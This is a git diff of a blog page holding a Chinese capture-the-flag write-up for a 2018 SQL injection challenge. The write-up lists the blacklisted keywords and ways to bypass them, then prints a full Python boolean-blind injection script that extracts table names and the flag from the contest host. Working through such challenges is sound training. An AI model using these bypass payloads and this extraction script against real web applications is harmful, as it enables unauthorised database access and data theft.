@@ -297,7 +297,7 @@
 	更新于
 	<a href="/2018/12/04/2018安恒杯好黑的黑名单/" itemprop="url">
 		<time datetime="2018-12-04T08:26:58.000Z" itemprop="dateUpdated">
-	  		2019-04-03
+	  		2019-04-05
 	  </time>
 	</a> 	
 
@@ -338,8 +338,9 @@
 <p>  尝试对其进行注入，发现明显的过滤。一旦关键字在黑名单里，就会有：<em>这么坏？想让我下面给你吃吗？XD</em> 的字样。</p>
 <p>  如果没有查到内容的话就返回：<em>想让我下面给你吃？</em></p>
 <p>  通过测试一下发现过滤的关键字有：</p>
-<pre><code>&#39; &quot; + = union  , &lt; &gt; * 空格 sleep ^ mid ascii like regexp  information_schema.tables
-</code></pre><p>（这是我发现的。这个名单并不全）</p>
+<pre class="line-numbers language-mysql"><code class="language-mysql">' " + = union  , < > * 空格 sleep ^ mid ascii like regexp  information_schema.tables
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>（这是我发现的。这个名单并不全）</p>
 <p>根据上面的名单我发现只能通过布尔盲注。</p>
 <p>下面介绍一下between and 的知识点。</p>
 <p>数据库名前两位：se</p>
@@ -349,40 +350,41 @@
 <p>然后就能够写脚本了。写脚本的时候得注意一下，还有几点得注意下，单引号过滤掉可以使用16进制，另外information_schema.tables被过滤可以使用information_schema%0a.tables这样去绕过。</p>
 <p>%a0和%0a都是代表空格。用来绕过空格的过滤。</p>
 <p>最后，附上我的菜鸡脚本。</p>
-<pre><code>import requests as rq
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests <span class="token keyword">as</span> rq
 
 
 
-url=&#39;http://58.87.124.66:4657/show.php?id=&#39;
-flag=&quot;&quot;
-header={
-    &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0&#39;
-}
-# res=rq.get(url)
-# print res.text
-# exit()
-c=&quot;&quot;
-for i in range(1,40):
-    for a in range(33,128):
-        b=str(hex(a))
-        # id=&quot;if((select%a0database()%a0between%a00x&quot;+c+b[2:4]+&quot;%a0and%a00x7e),1,2)&quot; #web
-        # id=&quot;if((select%0a(select%0agroup_concat(table_name)%0afrom%0ainformation_schema%0a.tables%0awhere%0atable_schema%0abetween%0a0x776562%0aand%0a0x776562)%0abetween%0a0x&quot;+c+b[2:4]+&quot;%0aand%0a0x7a),1,2)&quot; #ADMIN,FLAGGG,MENU 
-        # id=&quot;if((select%a0(Select%a0group_concat(column_name)%a0from%a0information_schema%a0.columns%a0where%a0table_name%a0between%a00x464c41474747%a0and%a00x464c41474747)%a0between%a00x&quot;+c+b[2:4]+&quot;%0aand%0a0x7a),1,2)&quot; #ID,F1AGG 
-        id=&quot;if((select%0a(select%0af1agg%0afrom%0aflaggg)%0abetween%0a0x&quot;+c+b[2:4]+&quot;%0aand%0a0x7e),1,2)&quot;
-        # print id
-        # params={&#39;id&#39;:id}
-        url1=url+id
-        res=rq.get(url1)
-        # print res.url
-        # print res.text.encode(&#39;gbk&#39;)
-        # exit()
-        if &quot;20&quot; in res.text:
-            c+=str(hex(a-1))[2:4]
-            flag+=str(chr(a-1))
-            print flag
-            break
-# FLAG{5D6352163C30BA51F1E2C0DD08622428} 
-</code></pre><p>还有就是脚本中不能用rq.get(url,pars=pas)来个get传参。因为那用传参的话，python会自动自动进行url编码。会导致出现黑名单里的东西。</p>
+url<span class="token operator">=</span><span class="token string">'http://58.87.124.66:4657/show.php?id='</span>
+flag<span class="token operator">=</span><span class="token string">""</span>
+header<span class="token operator">=</span><span class="token punctuation">{</span>
+    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0'</span>
+<span class="token punctuation">}</span>
+<span class="token comment" spellcheck="true"># res=rq.get(url)</span>
+<span class="token comment" spellcheck="true"># print res.text</span>
+<span class="token comment" spellcheck="true"># exit()</span>
+c<span class="token operator">=</span><span class="token string">""</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> a <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        b<span class="token operator">=</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token comment" spellcheck="true"># id="if((select%a0database()%a0between%a00x"+c+b[2:4]+"%a0and%a00x7e),1,2)" #web</span>
+        <span class="token comment" spellcheck="true"># id="if((select%0a(select%0agroup_concat(table_name)%0afrom%0ainformation_schema%0a.tables%0awhere%0atable_schema%0abetween%0a0x776562%0aand%0a0x776562)%0abetween%0a0x"+c+b[2:4]+"%0aand%0a0x7a),1,2)" #ADMIN,FLAGGG,MENU </span>
+        <span class="token comment" spellcheck="true"># id="if((select%a0(Select%a0group_concat(column_name)%a0from%a0information_schema%a0.columns%a0where%a0table_name%a0between%a00x464c41474747%a0and%a00x464c41474747)%a0between%a00x"+c+b[2:4]+"%0aand%0a0x7a),1,2)" #ID,F1AGG </span>
+        id<span class="token operator">=</span><span class="token string">"if((select%0a(select%0af1agg%0afrom%0aflaggg)%0abetween%0a0x"</span><span class="token operator">+</span>c<span class="token operator">+</span>b<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"%0aand%0a0x7e),1,2)"</span>
+        <span class="token comment" spellcheck="true"># print id</span>
+        <span class="token comment" spellcheck="true"># params={'id':id}</span>
+        url1<span class="token operator">=</span>url<span class="token operator">+</span>id
+        res<span class="token operator">=</span>rq<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url1<span class="token punctuation">)</span>
+        <span class="token comment" spellcheck="true"># print res.url</span>
+        <span class="token comment" spellcheck="true"># print res.text.encode('gbk')</span>
+        <span class="token comment" spellcheck="true"># exit()</span>
+        <span class="token keyword">if</span> <span class="token string">"20"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            c<span class="token operator">+=</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>a<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>
+            flag<span class="token operator">+=</span>str<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>a<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token keyword">print</span> flag
+            <span class="token keyword">break</span>
+<span class="token comment" spellcheck="true"># FLAG{5D6352163C30BA51F1E2C0DD08622428} </span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>还有就是脚本中不能用rq.get(url,pars=pas)来个get传参。因为那用传参的话，python会自动自动进行url编码。会导致出现黑名单里的东西。</p>
 <p>也可以把if（0，1，2）换成-1 or （语句）</p>
 <p>对了，等号可以用in来绕过。</p>
 <p>我的脚本有点问题。跑出来的都是大写，其实人家都是小写。（这个问题我不知道如何解决。哎，菜鸡的烦恼。。。）</p>
@@ -492,6 +494,7 @@ function ge...
 						</a>
 						<p>
 							知识储备strcmp()函数int strcmp ( string $str1 , string $str2 )
+
 说明
 注意该比较区分大小写。
 参数
@@ -500,7 +503,7 @@ str1
 str2
 第二个字符串。
 返回值
-strcmp二进制安全字...
+strcmp二进制安全...
 						</p>
 					</div>
 
@@ -558,7 +561,7 @@ ctf题与真正的漏洞有差距。需要换种思维来考虑问题。
 							首先，护网杯对新手不友好。看题看到绝望！！！全程懵逼状态。好啦不吐槽啦。。。。
 进入正题：迟来的签到题
 首先从文件下载下来看着像base64.但通过base64解码工具解码出来
-    V_UPVSUSUQR^W_###QV&#...
+    V_UPVSUSUQR^W_###QV'R...
 						</p>
 					</div>
 
